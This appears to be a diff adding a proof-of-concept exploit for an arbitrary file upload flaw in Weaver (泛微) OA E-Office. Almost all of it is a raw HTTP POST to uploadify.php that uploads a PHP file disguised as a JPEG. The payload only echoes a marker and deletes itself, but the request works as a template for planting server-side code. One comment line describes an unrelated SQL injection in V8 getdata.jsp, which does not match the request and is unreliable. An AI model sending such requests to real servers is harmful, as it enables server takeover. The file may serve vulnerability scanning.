@@ -1,0 +1,17 @@
+# 泛微OA E-Office uploadify 任意文件上传漏洞
+# 泛微OA V8 getdata.jsp 存在SQL注入漏洞，攻击者可通过该漏洞上传恶意文件控制服务器
+POST /inc/jquery/uploadify/uploadify.php?acid=80025433&bid=hd_tag_m8mv25zm HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25zm
+RM-PRO-Token: 28256c8d19642d489bc6f42424c60b9f
+RM-PRO-Time: 1742808516590
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+--e64bdf16c554bbc109cecef6451c26a4
+Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
+Content-Type: image/jpeg
+
+<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>
+
+--e64bdf16c554bbc109cecef6451c26a4--
